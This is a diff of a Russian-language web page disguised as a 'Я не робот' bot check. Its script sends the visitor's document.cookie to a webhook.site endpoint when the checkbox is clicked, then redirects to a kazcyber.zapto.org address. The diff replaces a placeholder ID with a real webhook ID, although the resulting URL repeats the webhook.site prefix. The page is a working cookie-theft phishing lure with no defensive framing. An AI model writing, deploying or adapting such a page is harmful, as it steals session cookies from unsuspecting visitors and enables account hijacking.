@@ -2,72 +2,79 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Проверка безопасности</title>
+  <title>Проверка: вы не бот</title>
   <style>
     body {
-      background: #f0f0f0;
-      font-family: sans-serif;
+      background: #eef2f7;
+      font-family: Arial, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
       margin: 0;
     }
-    .box {
+
+    .container {
       background: white;
-      padding: 30px;
+      padding: 40px;
       border-radius: 10px;
       text-align: center;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
     }
+
+    .checkbox {
+      display: inline-flex;
+      align-items: center;
+      cursor: pointer;
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+
+    .checkbox input {
+      margin-right: 10px;
+      width: 20px;
+      height: 20px;
+    }
+
     .spinner {
+      display: none;
       border: 6px solid #f3f3f3;
       border-top: 6px solid #007bff;
       border-radius: 50%;
       width: 50px;
       height: 50px;
-      animation: spin 1s linear infinite;
       margin: 20px auto;
+      animation: spin 1s linear infinite;
     }
-    button {
-      margin-top: 20px;
-      padding: 10px 20px;
-      font-size: 16px;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #0056b3;
-    }
+
     @keyframes spin {
-      0% { transform: rotate(0); }
+      0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Вы не бот?</h2>
-    <p>Нажмите кнопку для продолжения</p>
-    <div class="spinner"></div>
-    <button onclick="sendCookies()">Проверить</button>
+  <div class="container">
+    <label class="checkbox">
+      <input type="checkbox" id="botCheckbox" onclick="sendCookies()"> Я не робот
+    </label>
+
+    <div class="spinner" id="spinner"></div>
   </div>
 
   <script>
     function sendCookies() {
-      fetch("https://webhook.site/ВАШ-ID?cookie=" + document.cookie)
+      document.getElementById('spinner').style.display = 'block'; // Показываем загрузку
+
+      fetch("https://webhook.site/https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
         .then(() => {
           setTimeout(() => {
             window.location.href = "https://kazcyber.zapto.org/index.php";
-          }, 3000);
+          }, 3000); // Пауза 3 сек
         });
     }
   </script>
 </body>
 </html>
-
 
 
